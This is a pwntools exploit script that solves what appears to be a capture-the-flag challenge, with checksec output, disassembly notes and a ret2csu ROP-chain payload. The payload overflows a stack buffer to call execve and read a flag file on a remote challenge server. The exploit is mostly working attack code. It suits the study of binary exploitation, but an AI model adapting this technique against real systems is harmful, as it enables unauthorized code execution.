'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

.text:000000000040060C                 mov     [rbp+a], rdi
.text:0000000000400610                 mov     [rbp+b], rsi
.text:0000000000400614                 mov     [rbp+c], rdx
.text:0000000000400618                 mov     rax, 46616C6C77316E64h
.text:0000000000400622                 cmp     [rbp+a], rax
.text:0000000000400626                 jnz     short loc_400651
.text:0000000000400628                 mov     rax, 57616E7473414749h
.text:0000000000400632                 cmp     [rbp+b], rax
.text:0000000000400636                 jnz     short loc_400651
.text:0000000000400638                 mov     rax, 726C667269656E64h
.text:0000000000400642                 cmp     [rbp+c], rax
.text:0000000000400646                 jnz     short loc_400651

.text:0000000000400710                 mov     rdx, r15
.text:0000000000400713                 mov     rsi, r14
.text:0000000000400716                 mov     edi, r13d
.text:0000000000400719                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]

.text:0000000000400726                 add     rsp, 8
.text:000000000040072A                 pop     rbx
.text:000000000040072B                 pop     rbp
.text:000000000040072C                 pop     r12
.text:000000000040072E                 pop     r13
.text:0000000000400730                 pop     r14
.text:0000000000400732                 pop     r15
.text:0000000000400734                 retn    
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "25028" 
filename = "./pwn"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

buffer_appending = cyclic(0x20 + 8)
# pop_rdi_ret_addr = 0x0000000000400733
csu_ret_serial_addr = 0x000000000040072A
csu_mov_addr = 0x0000000000400710
gift1_addr = 0x00000000004007BB
gift2_addr = 0x0000000000601050
gift3_addr = 0x0000000000601068
# back_door_addr = 0x000000000040060C
# a_value = 0x46616C6C77316E64
# b_value = 0x57616E7473414749
# c_value = 0x726C667269656E64
rbx_value = 0x00
rbp_value = 0x00

def B():
    gdb.attach(io)
    pause()

def pwn():
    # execve("/bin/cat", {“/bin/cat”,”/flag”,NULL}, 0)
    payload = buffer_appending
    payload += p64(csu_ret_serial_addr) + p64(rbx_value) + p64(rbp_value)
    payload += p64(gift3_addr) + p64(gift1_addr) + p64(gift2_addr) + p64(0)
    payload += p64(csu_mov_addr)
    
    # too long for 0x70 read
    # payload += p64(pop_rdi_ret_addr) + p64(a_value)
    # payload += p64(csu_ret_serial_addr) + p64(0) + p64(rbx_value) + p64(rbp_value) 
    # payload += p64(back_door_addr) + p64(a_value) + p64(b_value) + p64(c_value)
    # payload += p64(csu_mov_addr)
    # B()
    io.sendlineafter(b'Remember to check it!\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
